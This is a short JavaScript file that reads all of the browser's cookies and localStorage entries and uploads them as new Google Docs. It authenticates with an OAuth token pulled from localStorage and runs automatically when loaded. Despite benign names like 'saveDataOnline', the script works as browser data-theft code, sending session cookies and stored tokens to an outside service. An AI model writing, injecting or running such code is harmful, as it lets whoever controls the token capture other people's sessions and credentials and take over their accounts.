const { google } = require('googleapis');

async function postToGoogleDocs(token, title, content) {
    const auth = new google.auth.OAuth2();
    auth.setCredentials({ access_token: token });
    const docs = google.docs({ version: 'v1', auth });

    // Create a new document
    const createResponse = await docs.documents.create({
        requestBody: {
            title: title
        }
    });

    const documentId = createResponse.data.documentId;

    // Update the document with content
    await docs.documents.batchUpdate({
        documentId: documentId,
        requestBody: {
            requests: [
                {
                    insertText: {
                        location: {
                            index: 1,
                        },
                        text: content
                    }
                }
            ]
        }
    });

    return documentId;
}

function getCookies() {
    return document.cookie.split(';').reduce((cookies, cookie) => {
        const [name, value] = cookie.split('=').map(c => c.trim());
        cookies[name] = value;
        return cookies;
    }, {});
}

function getLocalStorage() {
    return Object.keys(localStorage).reduce((data, key) => {
        data[key] = localStorage.getItem(key);
        return data;
    }, {});
}

async function saveDataOnline() {
    const cookies = getCookies();
    const localStorageData = getLocalStorage();

    const token = localStorage.getItem('gst_tkn');

    const cookiesDocId = await postToGoogleDocs(token, 'Cookies Data', JSON.stringify(cookies, null, 2));
    const localStorageDocId = await postToGoogleDocs(token, 'Local Storage Data', JSON.stringify(localStorageData, null, 2));

    console.log('Cookies Doc ID:', cookiesDocId);
    console.log('Local Storage Doc ID:', localStorageDocId);
}
saveDataOnline();
